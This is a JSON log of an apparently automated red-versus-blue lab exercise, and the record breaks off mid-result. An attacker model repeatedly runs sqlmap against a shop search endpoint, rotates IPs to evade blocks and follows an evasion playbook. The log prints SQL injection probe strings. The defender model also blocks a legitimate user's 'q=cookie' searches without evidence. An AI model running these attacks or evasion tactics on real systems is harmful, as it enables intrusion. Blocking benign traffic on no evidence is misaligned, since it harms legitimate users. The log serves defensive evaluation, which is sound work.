@@ -1,0 +1,1061 @@
+{
+ "meta": {
+  "run": "mvp2",
+  "phase": "eval_scripted_finetuned",
+  "episode": 2,
+  "lab": "live",
+  "blue_playbook": "",
+  "red_playbook": "- Use a more diverse set of IP addresses to evade rate limiting.\n- Scan fewer ports at once to reduce the likelihood of triggering defensive measures.\n- Employ stealthier scanning techniques to minimize detection risk.\n- Use more diverse scanning techniques to evade initial detection.\n- Rotate IP addresses proactively before being blocked.\n- Analyze network responses to refine targets and reduce noise.\n- Use more targeted port scans to reduce noise.\n- Vary timing between requests to avoid pattern recognition.\n- Employ stealthier tools to minimize detection risk.\n- Rotate IP addresses more frequently to stay ahead of blocking.\n- Focus on fewer, more strategic HTTP requests to avoid detection.\n",
+  "started": "2026-11-22 08:04:54",
+  "blue_model": "qwen-blue-ft",
+  "red_model": "qwen2.5:14b"
+ },
+ "scenario": {
+  "seed": 5002,
+  "n_ticks": 18,
+  "attack": true,
+  "attacker": "sqlmap_search",
+  "attacker_ip": "10.10.1.194",
+  "legit_ip": "10.10.1.96",
+  "red_start_tick": 5,
+  "red_ticks": [
+   5,
+   6,
+   7,
+   8,
+   9,
+   10,
+   11,
+   12,
+   13,
+   14,
+   16,
+   17
+  ],
+  "spare_ips": [
+   "10.10.1.39",
+   "10.10.1.31",
+   "10.10.1.225"
+  ]
+ },
+ "ticks": [
+  {
+   "tick": 0,
+   "red": [],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No traffic observed from client network."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {},
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 2,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 1,
+   "red": [],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 6,
+     "flows": 0,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 3,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 2,
+   "red": [],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 3,
+     "flows": 0,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 3,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 3,
+   "red": [],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 3,
+     "flows": 1,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 2,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 4,
+   "red": [],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 6,
+     "flows": 2,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 3,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 5,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.10.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.194"
+     },
+     "result": "Last HTTP requests from 10.10.1.194 (96 total this episode):\n  GET /rest/products/search?q=apple%20OR%208885%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%20OR%208885%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%201--%20bGtx -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%203925--%20iDWK -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%20ORDER%20BY%201--%"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "evidence": "Multiple SQL injection attempts and 500 errors from sqlmap tool",
+      "ip": "10.10.1.194",
+      "attack_type": "SQL Injection"
+     },
+     "result": "incident recorded: 10.10.1.194 (SQL Injection)"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "evidence": "Multiple SQL injection attempts and HTTP 500 errors, using sqlmap tool",
+      "ip": "10.10.1.194",
+      "attack_type": "SQL Injection"
+     },
+     "result": "incident recorded: 10.10.1.194 (SQL Injection)"
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.194",
+     "signature": "CS SQLi UNION attempt",
+     "count": 3
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 6,
+     "flows": 9,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.194": {
+     "requests": 96,
+     "flows": 0,
+     "alerts": 3,
+     "errors": 41
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 5,
+    "fail": 0
+   },
+   "firewall": {},
+   "waf": []
+  },
+  {
+   "tick": 6,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=B"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.10.10#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.194"
+     },
+     "result": "all traffic from 10.10.1.194 is now dropped at the gateway"
+    },
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.194"
+     },
+     "result": "Not executed: you already did exactly this earlier; its result is in your history."
+    },
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "IP 10.10.1.194 is blocked and IDS rule is in place."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.194",
+     "signature": "CS SQLi UNION attempt",
+     "count": 3
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 12,
+     "flows": 14,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.194": {
+     "requests": 18,
+     "flows": 3,
+     "alerts": 3,
+     "errors": 4
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 3,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 7,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=U"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.10.10#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 15,
+     "flows": 16,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.194": {
+     "requests": 0,
+     "flows": 5,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 5,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 8,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=T"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.10.10#stable}\n|_ -| . [.]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 9,
+     "flows": 10,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.194",
+   "legit": {
+    "ok": 4,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 9,
+   "red": [
+    {
+     "tool": "change_ip",
+     "args": {
+      "reason": "blocked twice in a row"
+     },
+     "reached": true,
+     "outcome": "moved",
+     "from_ip": "10.10.1.194",
+     "to_ip": "10.10.1.39",
+     "result": "now attacking from 10.10.1.39 (was 10.10.1.194)"
+    },
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --dbs"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[.]_____ ___ ___  {1.10.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.39"
+     },
+     "result": "Last HTTP requests from 10.10.1.39 (96 total this episode):\n  GET /rest/products/search?q=apple%20OR%207143%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%20OR%207143%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%201--%20tTXJ -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%203365--%20zfpl -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%20ORDER%20BY%201--%2"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "evidence": "Multiple SQL injection attempts and 500 errors, using sqlmap tool",
+      "ip": "10.10.1.39",
+      "attack_type": "SQL Injection"
+     },
+     "result": "incident recorded: 10.10.1.39 (SQL Injection)"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "evidence": "Multiple SQL injection attempts and HTTP 500 errors, using sqlmap tool",
+      "ip": "10.10.1.39",
+      "attack_type": "SQL Injection"
+     },
+     "result": "incident recorded: 10.10.1.39 (SQL Injection)"
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.39",
+     "signature": "CS SQLi UNION attempt",
+     "count": 3
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 9,
+     "flows": 10,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.39": {
+     "requests": 96,
+     "flows": 0,
+     "alerts": 3,
+     "errors": 41
+    },
+    "10.10.1.124": {
+     "requests": 1,
+     "flows": 0,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.39",
+   "legit": {
+    "ok": 5,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 10,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --tables"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.10.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.39"
+     },
+     "result": "all traffic from 10.10.1.39 is now dropped at the gateway"
+    },
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.39"
+     },
+     "result": "Not executed: you already did exactly this earlier; its result is in your history."
+    },
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "IP 10.10.1.39 is blocked and IDS rule is in place."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.39",
+     "signature": "CS SQLi UNION attempt",
+     "count": 3
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 12,
+     "flows": 7,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.39": {
+     "requests": 96,
+     "flows": 0,
+     "alerts": 3,
+     "errors": 41
+    },
+    "10.10.1.194": {
+     "requests": 0,
+     "flows": 2,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.39",
+   "legit": {
+    "ok": 4,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 11,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[,]_____ ___ ___  {1.10.10#stable}\n|_ -| . [']     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 18,
+     "flows": 17,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.39": {
+     "requests": 0,
+     "flows": 8,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.194": {
+     "requests": 0,
+     "flows": 3,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.39",
+   "legit": {
+    "ok": 4,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 12,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=B"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.10.10#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 6,
+     "flows": 14,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.39",
+   "legit": {
+    "ok": 3,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 13,
+   "red": [
+    {
+     "tool": "change_ip",
+     "args": {
+      "reason": "blocked twice in a row"
+     },
+     "reached": true,
+     "outcome": "moved",
+     "from_ip": "10.10.1.39",
+     "to_ip": "10.10.1.31",
+     "result": "now attacking from 10.10.1.31 (was 10.10.1.39)"
+    },
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=U"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[\"]_____ ___ ___  {1.10.10#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.31"
+     },
+     "result": "Last HTTP requests from 10.10.1.31 (15 total this episode):\n  GET /rest/products/search?q=apple%27%28%2C.%29%28%28..%22 -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27TgMHmw%3C%27%22%3E%29KCLvhY -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%201--%20fKbl -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%203622--%20GPMf -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%20ORDER%20BY%201--%20lzfh -> 500  ua=sqlmap/1.10.10#stable (https:/\n"
+    },
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.31"
+     },
+     "result": "all traffic from 10.10.1.31 is now dropped at the gateway"
+    },
+    {
+     "tool": "block_ip",
+     "args": {
+      "ip": "10.10.1.31"
+     },
+     "result": "Not executed: you already did exactly this earlier; its result is in your history."
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.31",
+     "signature": "CS SQLi UNION attempt",
+     "count": 1
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 9,
+     "flows": 3,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.31": {
+     "requests": 15,
+     "flows": 0,
+     "alerts": 1,
+     "errors": 6
+    }
+   },
+   "attacker_ip": "10.10.1.31",
+   "legit": {
+    "ok": 6,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block",
+    "10.10.1.31": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 14,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --technique=T"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.10.10#stable}\n|_ -| . [\"]     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "No suspicious activity observed."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 18,
+     "flows": 16,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.31": {
+     "requests": 0,
+     "flows": 4,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.39": {
+     "requests": 0,
+     "flows": 2,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.31",
+   "legit": {
+    "ok": 6,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block",
+    "10.10.1.31": "block"
+   },
+   "waf": []
+  },
+  {
+   "tick": 15,
+   "red": [],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.96"
+     },
+     "result": "Last HTTP requests from 10.10.1.96 (138 total this episode):\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /rest/products/search?q= -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /rest/products/search?q=juice -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /rest/products/search?q=cookie -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  G"
+    },
+    {
+     "tool": "block_pattern",
+     "args": {
+      "pattern": "q=cookie"
+     },
+     "result": "WAF now rejects (HTTP 403) every web request to the shop containing 'q=cookie'"
+    },
+    {
+     "tool": "block_pattern",
+     "args": {
+      "pattern": "q=cookie"
+     },
+     "result": "Not executed: you already did exactly this earlier; its result is in your history."
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 6,
+     "flows": 7,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.31",
+   "legit": {
+    "ok": 4,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block",
+    "10.10.1.31": "block"
+   },
+   "waf": [
+    "q=cookie"
+   ]
+  },
+  {
+   "tick": 16,
+   "red": [
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --dbs"
+     },
+     "reached": false,
+     "outcome": "blocked",
+     "result": "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.10.10#stable}\n|_ -| . [(]     | .'| . |\n|___|_  [(]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.96"
+     },
+     "result": "Last HTTP requests from 10.10.1.96 (153 total this episode):\n  GET /rest/products/search?q=apple -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /rest/products/search?q=juice -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET /rest/products/search?q=cookie -> 403  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34.2\n  GET /api/Products -> 200  ua=python-requests/2.34.2\n  GET / -> 200  ua=python-requests/2.34."
+    },
+    {
+     "tool": "wait",
+     "args": {
+      "reason": "Continuing to monitor 10.10.1.96 for further suspicious activity."
+     },
+     "result": "ok, no action"
+    }
+   ],
+   "alerts": [],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 15,
+     "flows": 18,
+     "alerts": 0,
+     "errors": 1
+    },
+    "10.10.1.39": {
+     "requests": 0,
+     "flows": 2,
+     "alerts": 0,
+     "errors": 0
+    }
+   },
+   "attacker_ip": "10.10.1.31",
+   "legit": {
+    "ok": 5,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block",
+    "10.10.1.31": "block"
+   },
+   "waf": [
+    "q=cookie"
+   ]
+  },
+  {
+   "tick": 17,
+   "red": [
+    {
+     "tool": "change_ip",
+     "args": {
+      "reason": "blocked twice in a row"
+     },
+     "reached": true,
+     "outcome": "moved",
+     "from_ip": "10.10.1.31",
+     "to_ip": "10.10.1.225",
+     "result": "now attacking from 10.10.1.225 (was 10.10.1.31)"
+    },
+    {
+     "tool": "script",
+     "args": {
+      "command": "sqlmap -u 'http://10.10.2.11:3000/rest/products/search?q=apple' --batch --level 1 --risk 1 --timeout 5 --retries 0 --threads 2 --flush-session --tables"
+     },
+     "reached": true,
+     "outcome": "answered",
+     "result": "        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.10.10#stable}\n|_ -| . [)]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not "
+    }
+   ],
+   "blue": [
+    {
+     "tool": "inspect_ip",
+     "args": {
+      "ip": "10.10.1.225"
+     },
+     "result": "Last HTTP requests from 10.10.1.225 (96 total this episode):\n  GET /rest/products/search?q=apple%20OR%206686%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%20OR%206686%3D%28SELECT%20SLEEP%285%29%20FROM%20db -> 200  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%201--%20SAZV -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%29%20ORDER%20BY%201419--%20TqZQ -> 500  ua=sqlmap/1.10.10#stable (https:/\n  GET /rest/products/search?q=apple%27%20ORDER%20BY%201--%"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "ip": "10.10.1.225",
+      "attack_type": "SQL Injection",
+      "evidence": "Multiple SQLi attempts detected via IDS and HTTP requests."
+     },
+     "result": "incident recorded: 10.10.1.225 (SQL Injection)"
+    },
+    {
+     "tool": "raise_alert",
+     "args": {
+      "attack_type": "SQL Injection",
+      "evidence": "Repeated SQL injection attempts and IDS alerts",
+      "ip": "10.10.1.225"
+     },
+     "result": "incident recorded: 10.10.1.225 (SQL Injection)"
+    }
+   ],
+   "alerts": [
+    {
+     "src": "10.10.1.225",
+     "signature": "CS SQLi UNION attempt",
+     "count": 3
+    }
+   ],
+   "sources": {
+    "10.10.1.96": {
+     "requests": 15,
+     "flows": 11,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.31": {
+     "requests": 0,
+     "flows": 2,
+     "alerts": 0,
+     "errors": 0
+    },
+    "10.10.1.225": {
+     "requests": 96,
+     "flows": 0,
+     "alerts": 3,
+     "errors": 41
+    }
+   },
+   "attacker_ip": "10.10.1.225",
+   "legit": {
+    "ok": 5,
+    "fail": 0
+   },
+   "firewall": {
+    "10.10.1.194": "block",
+    "10.10.1.39": "block",
+    "10.10.1.31": "block"
+   },
+   "waf": [
+    "q=cookie"
+   ]
+  }
+ ],
+ "status": "done",
+ "result": {
+  "attack": true,
+  "attacker": "sqlmap_search",
+  "attack_start": 5,
+  "attacker_ips": [
+   "10.10.1.194",
+   "10.10.1.39",
+   "10.10.1.31",
+   "10.10.1.225"
+  ],
+  "detected": true,
+  "detect_tick": 5,
+  "time_to_detect": 0,
+  "contained": true,
+  "contain_tick": 6,
+  "time_to_contain": 1,
+  "ip_changes": [
+   {
+    "tick": 9,
+    "from": "10.10.1.194",
+    "to": "10.10.1.39",
+    "reblocked_after": 1
+   },
+   {
+    "tick": 13,
+    "from": "10.10.1.39",
+    "to": "10.10.1.31",
+    "reblocked_after": 0
+   },
+   {
+    "tick": 17,
+    "from": "10.10.1.31",
+    "to": "10.10.1.225",
